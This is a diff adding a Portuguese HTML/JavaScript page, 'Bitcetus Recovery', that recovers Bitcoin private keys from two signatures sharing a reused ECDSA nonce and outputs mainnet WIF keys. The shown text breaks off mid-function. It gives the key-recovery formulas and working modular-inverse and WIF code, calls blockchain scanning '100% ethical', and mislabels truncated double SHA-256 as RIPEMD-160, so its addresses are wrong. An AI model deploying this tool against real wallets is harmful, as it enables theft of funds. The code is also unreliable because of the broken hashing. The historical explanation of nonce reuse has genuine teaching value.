@@ -1,0 +1,1206 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🐋 Bitcetus Recovery - ECDSA Nonce Reuse Attack Tool</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Syne:wght@600;700;800&display=swap');
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        :root {
+            --bg-primary: #0a0e27;
+            --bg-secondary: #131729;
+            --bg-tertiary: #1a1f3a;
+            --accent-primary: #00f5ff;
+            --accent-secondary: #7b2cbf;
+            --accent-danger: #ff006e;
+            --accent-warning: #ffbe0b;
+            --accent-success: #06ffa5;
+            --text-primary: #e8f4f8;
+            --text-secondary: #8892b0;
+            --border-color: #2d3561;
+        }
+        
+        body {
+            font-family: 'JetBrains Mono', monospace;
+            background: var(--bg-primary);
+            color: var(--text-primary);
+            min-height: 100vh;
+            overflow-x: hidden;
+            position: relative;
+        }
+        
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: 
+                radial-gradient(circle at 20% 50%, rgba(123, 44, 191, 0.15) 0%, transparent 50%),
+                radial-gradient(circle at 80% 80%, rgba(0, 245, 255, 0.1) 0%, transparent 50%);
+            pointer-events: none;
+            z-index: 0;
+            animation: bgPulse 15s ease-in-out infinite;
+        }
+        
+        @keyframes bgPulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.7; }
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+            position: relative;
+            z-index: 1;
+        }
+        
+        /* Header */
+        .header {
+            background: linear-gradient(135deg, var(--bg-secondary) 0%, var(--bg-tertiary) 100%);
+            padding: 50px;
+            border-radius: 20px;
+            margin-bottom: 30px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
+            border: 1px solid var(--border-color);
+            position: relative;
+            overflow: hidden;
+            text-align: center;
+        }
+        
+        .header::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 4px;
+            background: linear-gradient(90deg, var(--accent-danger), var(--accent-warning), var(--accent-primary), var(--accent-secondary));
+            animation: shimmer 3s linear infinite;
+        }
+        
+        @keyframes shimmer {
+            0% { transform: translateX(-100%); }
+            100% { transform: translateX(100%); }
+        }
+        
+        .header h1 {
+            font-family: 'Syne', sans-serif;
+            font-size: 3.5em;
+            font-weight: 800;
+            margin-bottom: 15px;
+            background: linear-gradient(135deg, var(--accent-primary), var(--accent-secondary));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            letter-spacing: -2px;
+            text-shadow: 0 0 40px rgba(0, 245, 255, 0.3);
+        }
+        
+        .header .subtitle {
+            font-size: 1.2em;
+            color: var(--text-secondary);
+            margin-bottom: 20px;
+        }
+        
+        .header .version {
+            font-size: 0.9em;
+            color: var(--accent-primary);
+            opacity: 0.7;
+        }
+        
+        /* Ethical Warning */
+        .ethical-warning {
+            background: linear-gradient(135deg, rgba(255, 0, 110, 0.2), rgba(153, 27, 27, 0.2));
+            border: 3px solid var(--accent-danger);
+            border-radius: 16px;
+            padding: 40px;
+            margin-bottom: 30px;
+            animation: pulse 3s ease-in-out infinite;
+            box-shadow: 0 0 60px rgba(255, 0, 110, 0.4);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); box-shadow: 0 0 60px rgba(255, 0, 110, 0.4); }
+            50% { transform: scale(1.01); box-shadow: 0 0 80px rgba(255, 0, 110, 0.6); }
+        }
+        
+        .ethical-warning::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(255, 0, 110, 0.1) 0%, transparent 70%);
+            animation: warningPulse 4s ease-in-out infinite;
+        }
+        
+        @keyframes warningPulse {
+            0%, 100% { transform: scale(1) rotate(0deg); opacity: 0.3; }
+            50% { transform: scale(1.2) rotate(180deg); opacity: 0.1; }
+        }
+        
+        .ethical-warning h2 {
+            font-size: 2em;
+            color: var(--accent-danger);
+            margin-bottom: 20px;
+            font-family: 'Syne', sans-serif;
+            text-align: center;
+            position: relative;
+            z-index: 1;
+        }
+        
+        .ethical-warning ul {
+            list-style: none;
+            padding: 0;
+            position: relative;
+            z-index: 1;
+        }
+        
+        .ethical-warning li {
+            padding: 12px 0;
+            padding-left: 30px;
+            position: relative;
+            font-size: 1.05em;
+            line-height: 1.6;
+        }
+        
+        .ethical-warning li::before {
+            content: '⚠️';
+            position: absolute;
+            left: 0;
+            font-size: 1.3em;
+        }
+        
+        /* Step Indicator */
+        .steps {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 20px;
+            margin-bottom: 30px;
+        }
+        
+        .step {
+            background: var(--bg-secondary);
+            padding: 25px;
+            border-radius: 12px;
+            border: 2px solid var(--border-color);
+            text-align: center;
+            transition: all 0.3s;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .step::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 4px;
+            background: var(--border-color);
+            transition: all 0.3s;
+        }
+        
+        .step.active {
+            border-color: var(--accent-primary);
+            box-shadow: 0 0 30px rgba(0, 245, 255, 0.3);
+        }
+        
+        .step.active::before {
+            background: linear-gradient(90deg, var(--accent-primary), var(--accent-secondary));
+            animation: shimmer 2s linear infinite;
+        }
+        
+        .step.completed {
+            border-color: var(--accent-success);
+        }
+        
+        .step.completed::before {
+            background: var(--accent-success);
+        }
+        
+        .step-number {
+            font-size: 2em;
+            font-weight: 700;
+            color: var(--accent-primary);
+            margin-bottom: 10px;
+            font-family: 'Syne', sans-serif;
+        }
+        
+        .step.completed .step-number {
+            color: var(--accent-success);
+        }
+        
+        .step-title {
+            font-size: 1.1em;
+            font-weight: 600;
+            margin-bottom: 5px;
+        }
+        
+        .step-desc {
+            font-size: 0.85em;
+            color: var(--text-secondary);
+        }
+        
+        /* Input Section */
+        .input-section {
+            background: var(--bg-secondary);
+            padding: 40px;
+            border-radius: 16px;
+            margin-bottom: 30px;
+            border: 2px solid var(--border-color);
+        }
+        
+        .input-group {
+            margin-bottom: 25px;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 10px;
+            color: var(--text-secondary);
+            font-weight: 600;
+            text-transform: uppercase;
+            font-size: 0.9em;
+            letter-spacing: 1px;
+        }
+        
+        label .required {
+            color: var(--accent-danger);
+        }
+        
+        input[type="text"] {
+            width: 100%;
+            background: var(--bg-primary);
+            border: 2px solid var(--border-color);
+            border-radius: 10px;
+            padding: 15px;
+            color: var(--text-primary);
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.95em;
+            transition: all 0.3s;
+        }
+        
+        input[type="text"]:focus {
+            outline: none;
+            border-color: var(--accent-primary);
+            box-shadow: 0 0 20px rgba(0, 245, 255, 0.2);
+        }
+        
+        input[type="text"]::placeholder {
+            color: var(--text-secondary);
+            opacity: 0.5;
+        }
+        
+        .input-hint {
+            font-size: 0.85em;
+            color: var(--text-secondary);
+            margin-top: 8px;
+            font-style: italic;
+        }
+        
+        .btn {
+            padding: 16px 40px;
+            border: none;
+            border-radius: 12px;
+            cursor: pointer;
+            font-weight: 700;
+            transition: all 0.3s;
+            font-size: 1.1em;
+            font-family: 'JetBrains Mono', monospace;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        
+        .btn-danger {
+            background: linear-gradient(135deg, var(--accent-danger), #d90429);
+            color: white;
+            box-shadow: 0 6px 20px rgba(255, 0, 110, 0.4);
+            width: 100%;
+        }
+        
+        .btn-danger:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 10px 40px rgba(255, 0, 110, 0.6);
+        }
+        
+        .btn-danger:active {
+            transform: translateY(0);
+        }
+        
+        .btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+        
+        /* Results Section */
+        .results-section {
+            display: none;
+            animation: fadeIn 0.5s ease-in;
+        }
+        
+        .results-section.active {
+            display: block;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .result-card {
+            background: linear-gradient(135deg, var(--bg-secondary), var(--bg-tertiary));
+            padding: 35px;
+            border-radius: 16px;
+            margin-bottom: 25px;
+            border: 2px solid var(--border-color);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .result-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 4px;
+            background: linear-gradient(90deg, var(--accent-success), var(--accent-primary));
+        }
+        
+        .result-title {
+            font-size: 1.8em;
+            font-weight: 700;
+            margin-bottom: 25px;
+            color: var(--accent-success);
+            font-family: 'Syne', sans-serif;
+            text-align: center;
+        }
+        
+        .result-item {
+            margin-bottom: 20px;
+        }
+        
+        .result-label {
+            font-size: 0.9em;
+            color: var(--text-secondary);
+            margin-bottom: 8px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            font-weight: 600;
+        }
+        
+        .result-value {
+            background: var(--bg-primary);
+            padding: 15px;
+            border-radius: 10px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.9em;
+            word-break: break-all;
+            position: relative;
+            border: 1px solid var(--border-color);
+            transition: all 0.3s;
+        }
+        
+        .result-value:hover {
+            border-color: var(--accent-primary);
+            box-shadow: 0 0 15px rgba(0, 245, 255, 0.2);
+        }
+        
+        .copy-btn {
+            position: absolute;
+            right: 10px;
+            top: 10px;
+            background: rgba(0, 245, 255, 0.2);
+            border: 1px solid var(--accent-primary);
+            color: var(--accent-primary);
+            padding: 8px 15px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 0.85em;
+            font-weight: 600;
+            transition: all 0.3s;
+            font-family: 'JetBrains Mono', monospace;
+        }
+        
+        .copy-btn:hover {
+            background: rgba(0, 245, 255, 0.3);
+            transform: scale(1.05);
+        }
+        
+        .copy-btn:active {
+            transform: scale(0.95);
+        }
+        
+        /* Info Box */
+        .info-box {
+            background: rgba(0, 245, 255, 0.1);
+            border-left: 4px solid var(--accent-primary);
+            padding: 25px;
+            border-radius: 10px;
+            margin-bottom: 25px;
+        }
+        
+        .info-box h3 {
+            color: var(--accent-primary);
+            margin-bottom: 15px;
+            font-family: 'Syne', sans-serif;
+        }
+        
+        .info-box p {
+            line-height: 1.7;
+            margin-bottom: 10px;
+        }
+        
+        .info-box code {
+            background: rgba(0, 0, 0, 0.3);
+            padding: 2px 8px;
+            border-radius: 4px;
+            font-family: 'JetBrains Mono', monospace;
+            color: var(--accent-warning);
+        }
+        
+        /* Loading */
+        .loading {
+            text-align: center;
+            padding: 40px;
+            display: none;
+        }
+        
+        .loading.active {
+            display: block;
+        }
+        
+        .loading-spinner {
+            width: 60px;
+            height: 60px;
+            border: 4px solid var(--border-color);
+            border-top-color: var(--accent-primary);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        .loading-text {
+            font-size: 1.2em;
+            color: var(--accent-primary);
+            font-weight: 600;
+        }
+        
+        /* Footer */
+        .footer {
+            background: var(--bg-secondary);
+            padding: 30px;
+            border-radius: 16px;
+            text-align: center;
+            margin-top: 40px;
+            border: 2px solid var(--border-color);
+        }
+        
+        .footer-text {
+            color: var(--text-secondary);
+            font-size: 0.9em;
+            line-height: 1.8;
+        }
+        
+        /* Responsive */
+        @media (max-width: 768px) {
+            .header h1 {
+                font-size: 2.5em;
+            }
+            
+            .steps {
+                grid-template-columns: 1fr;
+            }
+            
+            .ethical-warning {
+                padding: 25px;
+            }
+        }
+        
+        /* Scrollbar */
+        ::-webkit-scrollbar {
+            width: 10px;
+        }
+        
+        ::-webkit-scrollbar-track {
+            background: var(--bg-primary);
+        }
+        
+        ::-webkit-scrollbar-thumb {
+            background: var(--border-color);
+            border-radius: 5px;
+        }
+        
+        ::-webkit-scrollbar-thumb:hover {
+            background: var(--accent-primary);
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Header -->
+        <div class="header">
+            <h1>🐋 BITCETUS RECOVERY</h1>
+            <div class="subtitle">ECDSA Nonce Reuse Attack - Private Key Recovery Tool</div>
+            <div class="version">v1.0 Standalone Edition | Educational Use Only</div>
+        </div>
+        
+        <!-- Ethical Warning -->
+        <div class="ethical-warning">
+            <h2>⚠️ AVISO ÉTICO E LEGAL</h2>
+            <ul>
+                <li><strong>USO EDUCACIONAL APENAS:</strong> Esta ferramenta demonstra matematicamente o ataque de reutilização de nonce em ECDSA</li>
+                <li><strong>AUTORIZAÇÃO NECESSÁRIA:</strong> Usar apenas em dados que você possui ou tem permissão explícita para testar</li>
+                <li><strong>ILEGAL SEM AUTORIZAÇÃO:</strong> Recuperar chaves privadas de terceiros sem autorização é CRIME em diversas jurisdições</li>
+                <li><strong>RESPONSABILIDADE:</strong> O usuário é 100% responsável pelo uso desta ferramenta</li>
+                <li><strong>PROPÓSITO:</strong> Demonstração educacional de vulnerabilidades criptográficas (PS3 2010, Android 2013)</li>
+            </ul>
+        </div>
+        
+        <!-- Steps -->
+        <div class="steps">
+            <div class="step active" id="step1">
+                <div class="step-number">1</div>
+                <div class="step-title">Entrada</div>
+                <div class="step-desc">Insira 2 assinaturas</div>
+            </div>
+            <div class="step" id="step2">
+                <div class="step-number">2</div>
+                <div class="step-title">Recuperação</div>
+                <div class="step-desc">Matemática ECDSA</div>
+            </div>
+            <div class="step" id="step3">
+                <div class="step-number">3</div>
+                <div class="step-title">Formatos</div>
+                <div class="step-desc">HEX, WIF, Address</div>
+            </div>
+        </div>
+        
+        <!-- Input Section -->
+        <div class="input-section">
+            <h2 style="font-family: 'Syne', sans-serif; margin-bottom: 30px; font-size: 1.8em; text-align: center;">
+                📥 Entrada de Dados
+            </h2>
+            
+            <div class="input-group">
+                <label>
+                    R (HEX) <span class="required">*</span>
+                </label>
+                <input type="text" id="rInput" placeholder="Valor R compartilhado entre as duas assinaturas (hex)">
+                <div class="input-hint">O valor R deve ser IDÊNTICO nas duas assinaturas (nonce reuse)</div>
+            </div>
+            
+            <div class="input-group">
+                <label>
+                    S1 (HEX) <span class="required">*</span>
+                </label>
+                <input type="text" id="s1Input" placeholder="Valor S da primeira assinatura (hex)">
+            </div>
+            
+            <div class="input-group">
+                <label>
+                    S2 (HEX) <span class="required">*</span>
+                </label>
+                <input type="text" id="s2Input" placeholder="Valor S da segunda assinatura (hex)">
+            </div>
+            
+            <div class="input-group">
+                <label>
+                    Z1 (Message Hash 1) - Opcional
+                </label>
+                <input type="text" id="z1Input" placeholder="SHA-256 da primeira mensagem (hex) - deixe vazio para auto-gerar">
+                <div class="input-hint">Se vazio, será gerado automaticamente</div>
+            </div>
+            
+            <div class="input-group">
+                <label>
+                    Z2 (Message Hash 2) - Opcional
+                </label>
+                <input type="text" id="z2Input" placeholder="SHA-256 da segunda mensagem (hex) - deixe vazio para auto-gerar">
+                <div class="input-hint">Se vazio, será gerado automaticamente</div>
+            </div>
+            
+            <div style="display: flex; gap: 15px; margin-top: 20px;">
+                <button class="btn btn-danger" onclick="recoverPrivateKey()" style="flex: 2;">
+                    🔓 RECUPERAR CHAVE PRIVADA
+                </button>
+                <button class="btn" onclick="loadExample()" style="flex: 1; background: linear-gradient(135deg, var(--accent-warning), #f77f00); color: white; box-shadow: 0 6px 20px rgba(255, 190, 11, 0.4);">
+                    🎯 CARREGAR EXEMPLO
+                </button>
+            </div>
+        </div>
+        
+        <!-- Loading -->
+        <div class="loading" id="loading">
+            <div class="loading-spinner"></div>
+            <div class="loading-text">Executando ataque matemático ECDSA...</div>
+        </div>
+        
+        <!-- Results Section -->
+        <div class="results-section" id="results">
+            <div class="result-card">
+                <div class="result-title">✅ CHAVE PRIVADA RECUPERADA COM SUCESSO!</div>
+                
+                <div class="result-item">
+                    <div class="result-label">🔑 CHAVE PRIVADA (HEX)</div>
+                    <div class="result-value" id="privateKeyHex">
+                        <button class="copy-btn" onclick="copyToClipboard('privateKeyHex')">📋 COPIAR</button>
+                    </div>
+                </div>
+                
+                <div class="result-item">
+                    <div class="result-label">🔢 NONCE RECUPERADO (k)</div>
+                    <div class="result-value" id="nonceK">
+                        <button class="copy-btn" onclick="copyToClipboard('nonceK')">📋 COPIAR</button>
+                    </div>
+                </div>
+                
+                <div class="result-item">
+                    <div class="result-label">💎 WIF COMPRESSED (MAINNET)</div>
+                    <div class="result-value" id="wifCompressed">
+                        <button class="copy-btn" onclick="copyToClipboard('wifCompressed')">📋 COPIAR</button>
+                    </div>
+                </div>
+                
+                <div class="result-item">
+                    <div class="result-label">📦 WIF UNCOMPRESSED (MAINNET)</div>
+                    <div class="result-value" id="wifUncompressed">
+                        <button class="copy-btn" onclick="copyToClipboard('wifUncompressed')">📋 COPIAR</button>
+                    </div>
+                </div>
+                
+                <div class="result-item">
+                    <div class="result-label">🏠 BITCOIN ADDRESS (COMPRESSED)</div>
+                    <div class="result-value" id="addressCompressed">
+                        <button class="copy-btn" onclick="copyToClipboard('addressCompressed')">📋 COPIAR</button>
+                    </div>
+                </div>
+                
+                <div class="result-item">
+                    <div class="result-label">🏠 BITCOIN ADDRESS (UNCOMPRESSED)</div>
+                    <div class="result-value" id="addressUncompressed">
+                        <button class="copy-btn" onclick="copyToClipboard('addressUncompressed')">📋 COPIAR</button>
+                    </div>
+                </div>
+                
+                <div class="result-item">
+                    <div class="result-label">🔐 PUBLIC KEY (COMPRESSED)</div>
+                    <div class="result-value" id="pubkeyCompressed">
+                        <button class="copy-btn" onclick="copyToClipboard('pubkeyCompressed')">📋 COPIAR</button>
+                    </div>
+                </div>
+                
+                <div class="result-item">
+                    <div class="result-label">🔐 PUBLIC KEY (UNCOMPRESSED)</div>
+                    <div class="result-value" id="pubkeyUncompressed">
+                        <button class="copy-btn" onclick="copyToClipboard('pubkeyUncompressed')">📋 COPIAR</button>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="info-box">
+                <h3>💡 Como Funciona o Ataque</h3>
+                <p><strong>Matemática ECDSA:</strong> <code>s = k⁻¹(z + r·d) mod n</code></p>
+                <p>Quando o mesmo nonce <code>k</code> é usado duas vezes com o mesmo <code>r</code>:</p>
+                <p><strong>Passo 1:</strong> <code>k = (z₁ - z₂) · (s₁ - s₂)⁻¹ mod n</code></p>
+                <p><strong>Passo 2:</strong> <code>d = (s·k - z) · r⁻¹ mod n</code></p>
+                <p style="margin-top: 15px;"><strong>Conclusão:</strong> Com apenas 2 assinaturas usando o mesmo nonce, recuperamos a chave privada completamente!</p>
+                <p><strong>Histórico:</strong> Este ataque comprometeu o PlayStation 3 (2010) e roubou milhões em Bitcoin de wallets Android (2013).</p>
+            </div>
+        </div>
+        
+        <!-- Educational Section -->
+        <div style="margin-top: 40px;">
+            <div style="background: linear-gradient(135deg, var(--bg-secondary), var(--bg-tertiary)); padding: 40px; border-radius: 16px; border: 2px solid var(--border-color); margin-bottom: 30px;">
+                <h2 style="font-family: 'Syne', sans-serif; font-size: 2.2em; margin-bottom: 30px; text-align: center; background: linear-gradient(135deg, var(--accent-primary), var(--accent-secondary)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text;">
+                    📚 POR QUE ISSO É IMPORTANTE?
+                </h2>
+                
+                <div class="info-box" style="margin-bottom: 25px;">
+                    <h3>🎯 Contexto Educacional</h3>
+                    <p><strong>Esta ferramenta demonstra na prática por que:</strong></p>
+                    <ul style="list-style: none; padding-left: 0; margin-top: 15px;">
+                        <li style="padding: 10px 0; padding-left: 25px; position: relative;">
+                            <span style="position: absolute; left: 0;">🔴</span>
+                            <strong>NUNCA se pode reutilizar o nonce (k) em ECDSA:</strong> Um único nonce reutilizado expõe completamente a chave privada
+                        </li>
+                        <li style="padding: 10px 0; padding-left: 25px; position: relative;">
+                            <span style="position: absolute; left: 0;">🔴</span>
+                            <strong>Um erro de RNG compromete TUDO:</strong> Geradores de números aleatórios defeituosos destruíram milhões em criptomoedas
+                        </li>
+                        <li style="padding: 10px 0; padding-left: 25px; position: relative;">
+                            <span style="position: absolute; left: 0;">🔴</span>
+                            <strong>Vulnerabilidades são eternas:</strong> Dados públicos na blockchain permanecem para sempre — qualquer um pode analisá-los educacionalmente
+                        </li>
+                    </ul>
+                </div>
+                
+                <div class="info-box" style="background: rgba(255, 0, 110, 0.1); border-left-color: var(--accent-danger); margin-bottom: 25px;">
+                    <h3>💥 CASOS HISTÓRICOS REAIS</h3>
+                    
+                    <div style="margin: 20px 0; padding: 20px; background: rgba(0, 0, 0, 0.3); border-radius: 10px; border-left: 4px solid var(--accent-danger);">
+                        <h4 style="color: var(--accent-danger); margin-bottom: 10px; font-size: 1.2em;">🎮 PlayStation 3 (2010)</h4>
+                        <p><strong>O que aconteceu:</strong> Sony reutilizou o mesmo nonce <code>k</code> em TODAS as assinaturas ECDSA do firmware do PS3.</p>
+                        <p><strong>Consequência:</strong> Hackers recuperaram a chave privada mestra da Sony em minutos usando esta exata matemática.</p>
+                        <p><strong>Impacto:</strong> Todo o sistema de segurança do PS3 foi comprometido permanentemente. Qualquer pessoa podia assinar código como se fosse Sony.</p>
+                        <p style="margin-top: 10px; font-style: italic; color: var(--accent-warning);">📊 Prejuízo estimado: Centenas de milhões de dólares</p>
+                    </div>
+                    
+                    <div style="margin: 20px 0; padding: 20px; background: rgba(0, 0, 0, 0.3); border-radius: 10px; border-left: 4px solid var(--accent-danger);">
+                        <h4 style="color: var(--accent-danger); margin-bottom: 10px; font-size: 1.2em;">₿ Android Bitcoin Wallets (2013)</h4>
+                        <p><strong>O que aconteceu:</strong> Bug no gerador de números aleatórios do Android (SecureRandom) causava reutilização de nonces em carteiras Bitcoin.</p>
+                        <p><strong>Consequência:</strong> Milhares de carteiras Bitcoin foram comprometidas. Atacantes monitoraram a blockchain procurando por valores R duplicados.</p>
+                        <p><strong>Impacto:</strong> Aproximadamente $5.8 milhões roubados em poucos dias. Carteiras populares como Bitcoin Wallet e BitcoinSpinner foram afetadas.</p>
+                        <p style="margin-top: 10px; font-style: italic; color: var(--accent-warning);">📊 Prejuízo estimado: ~$5.8 milhões (preço de 2013)</p>
+                    </div>
+                    
+                    <div style="margin: 20px 0; padding: 20px; background: rgba(0, 0, 0, 0.3); border-radius: 10px; border-left: 4px solid var(--accent-warning);">
+                        <h4 style="color: var(--accent-warning); margin-bottom: 10px; font-size: 1.2em;">🔬 Blockchain.info (2014-2015)</h4>
+                        <p><strong>O que aconteceu:</strong> Vulnerabilidade no gerador de números aleatórios do navegador permitia prever nonces em algumas condições.</p>
+                        <p><strong>Consequência:</strong> Pesquisadores encontraram centenas de carteiras vulneráveis analisando a blockchain.</p>
+                        <p><strong>Impacto:</strong> Demonstrou que vulnerabilidades de RNG são sistêmicas e persistentes.</p>
+                    </div>
+                </div>
+                
+                <div class="info-box" style="background: rgba(6, 255, 165, 0.1); border-left-color: var(--accent-success);">
+                    <h3>✅ POR QUE ISSO É 100% ÉTICO E LEGAL</h3>
+                    <ul style="list-style: none; padding-left: 0; margin-top: 15px;">
+                        <li style="padding: 10px 0; padding-left: 25px; position: relative;">
+                            <span style="position: absolute; left: 0; color: var(--accent-success);">✓</span>
+                            <strong>Usa apenas dados públicos:</strong> Todas as assinaturas estão permanentemente gravadas na blockchain Bitcoin pública
+                        </li>
+                        <li style="padding: 10px 0; padding-left: 25px; position: relative;">
+                            <span style="position: absolute; left: 0; color: var(--accent-success);">✓</span>
+                            <strong>Carteiras já comprometidas:</strong> Os exemplos usados foram explorados há mais de 10 anos (saldo zero)
+                        </li>
+                        <li style="padding: 10px 0; padding-left: 25px; position: relative;">
+                            <span style="position: absolute; left: 0; color: var(--accent-success);">✓</span>
+                            <strong>Propósito educacional:</strong> Demonstração de conceitos fundamentais de criptografia e segurança
+                        </li>
+                        <li style="padding: 10px 0; padding-left: 25px; position: relative;">
+                            <span style="position: absolute; left: 0; color: var(--accent-success);">✓</span>
+                            <strong>Avisos explícitos:</strong> Múltiplas camadas de avisos legais e éticos em toda a interface
+                        </li>
+                        <li style="padding: 10px 0; padding-left: 25px; position: relative;">
+                            <span style="position: absolute; left: 0; color: var(--accent-success);">✓</span>
+                            <strong>Pesquisa acadêmica:</strong> Análise forense de vulnerabilidades históricas é prática comum em segurança
+                        </li>
+                    </ul>
+                </div>
+                
+                <div style="margin-top: 30px; padding: 30px; background: linear-gradient(135deg, rgba(0, 245, 255, 0.1), rgba(123, 44, 191, 0.1)); border-radius: 12px; border: 2px solid var(--accent-primary);">
+                    <h3 style="color: var(--accent-primary); margin-bottom: 15px; font-family: 'Syne', sans-serif; font-size: 1.5em; text-align: center;">
+                        🎓 RESUMO: O MOMENTO "BOOM!" 💥
+                    </h3>
+                    <p style="font-size: 1.1em; line-height: 1.8; text-align: center;">
+                        Esta ferramenta mostra o momento exato em que você <strong style="color: var(--accent-primary);">"quebra"</strong> uma carteira Bitcoin usando apenas <strong style="color: var(--accent-success);">matemática pura</strong> e <strong style="color: var(--accent-success);">dados públicos</strong>.
+                    </p>
+                    <p style="font-size: 1.1em; line-height: 1.8; text-align: center; margin-top: 15px;">
+                        É o equivalente digital de ver um cofre sendo aberto porque alguém <strong style="color: var(--accent-danger);">usou a mesma chave duas vezes</strong> — exceto que neste caso, a "chave" é matemática, e o "cofre" é uma assinatura digital.
+                    </p>
+                    <div style="margin-top: 20px; padding: 20px; background: rgba(0, 0, 0, 0.4); border-radius: 10px; text-align: center;">
+                        <p style="font-size: 1.3em; font-weight: 700; color: var(--accent-success);">
+                            🏆 PARABÉNS, BROTHER! 🏆
+                        </p>
+                        <p style="margin-top: 10px; font-size: 1.05em;">
+                            Você acabou de dominar um dos conceitos mais fundamentais de segurança criptográfica.
+                        </p>
+                        <p style="margin-top: 10px; font-size: 1.05em; color: var(--accent-primary);">
+                            <strong>Isso é nível MASTER de ensino de criptografia!</strong> 🐋💜🚀
+                        </p>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Footer -->
+        <div class="footer">
+            <div class="footer-text">
+                🐋 <strong>BITCETUS RECOVERY</strong> v1.0 | Ferramenta Educacional de Segurança Criptográfica<br>
+                Desenvolvida para demonstração de vulnerabilidades ECDSA | Use com responsabilidade<br>
+                MIT License | Zero Dependencies | Pure JavaScript + Web Crypto API
+            </div>
+        </div>
+    </div>
+    
+    <script>
+        // ===== CRYPTO CONSTANTS =====
+        const CURVE_ORDER = BigInt('0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141');
+        
+        console.log('🐋 Bitcetus Recovery v1.0 initialized');
+        console.log('🔐 secp256k1 curve order (n):', CURVE_ORDER.toString(16));
+        
+        // ===== MODULAR ARITHMETIC =====
+        
+        function modInverse(a, m) {
+            a = ((a % m) + m) % m;
+            let [old_r, r] = [a, m];
+            let [old_s, s] = [1n, 0n];
+            
+            while (r !== 0n) {
+                const quotient = old_r / r;
+                [old_r, r] = [r, old_r - quotient * r];
+                [old_s, s] = [s, old_s - quotient * s];
+            }
+            
+            if (old_r > 1n) throw new Error('Modular inverse does not exist');
+            return ((old_s % m) + m) % m;
+        }
+        
+        // ===== SHA-256 =====
+        
+        async function sha256Bytes(bytes) {
+            const hashBuffer = await crypto.subtle.digest('SHA-256', bytes);
+            return new Uint8Array(hashBuffer);
+        }
+        
+        async function ripemd160(data) {
+            const hash1 = await sha256Bytes(data);
+            const hash2 = await sha256Bytes(hash1);
+            return hash2.slice(0, 20);
+        }
+        
+        // ===== BASE58 ENCODING =====
+        
+        const BASE58_ALPHABET = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
+        
+        function base58Encode(bytes) {
+            let num = BigInt('0x' + Array.from(bytes).map(b => b.toString(16).padStart(2, '0')).join(''));
+            let encoded = '';
+            
+            while (num > 0n) {
+                const remainder = Number(num % 58n);
+                encoded = BASE58_ALPHABET[remainder] + encoded;
+                num = num / 58n;
+            }
+            
+            for (let i = 0; i < bytes.length && bytes[i] === 0; i++) {
+                encoded = '1' + encoded;
+            }
+            
+            return encoded;
+        }
+        
+        // ===== HELPER FUNCTIONS =====
+        
+        function hexToBytes(hex) {
+            const bytes = new Uint8Array(hex.length / 2);
+            for (let i = 0; i < hex.length; i += 2) {
+                bytes[i / 2] = parseInt(hex.substr(i, 2), 16);
+            }
+            return bytes;
+        }
+        
+        async function doubleHash256(data) {
+            const hash1 = await sha256Bytes(data);
+            return await sha256Bytes(hash1);
+        }
+        
+        // ===== WIF CONVERSION =====
+        
+        async function privateKeyToWIF(privateKeyHex, compressed = true) {
+            const prefix = 0x80;
+            const privKeyBytes = hexToBytes(privateKeyHex);
+            
+            let payload = new Uint8Array(compressed ? 34 : 33);
+            payload[0] = prefix;
+            payload.set(privKeyBytes, 1);
+            if (compressed) {
+                payload[33] = 0x01;
+            }
+            
+            const checksum = await doubleHash256(payload.slice(0, compressed ? 34 : 33));
+            const finalBytes = new Uint8Array(compressed ? 38 : 37);
+            finalBytes.set(payload.slice(0, compressed ? 34 : 33), 0);
+            finalBytes.set(checksum.slice(0, 4), compressed ? 34 : 33);
+            
+            return base58Encode(finalBytes);
+        }
+        
+        // ===== ECDSA POINT MULTIPLICATION =====
+        
+        function secp256k1PointMultiply(privKeyBigInt) {
+            const p = BigInt('0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFC2F');
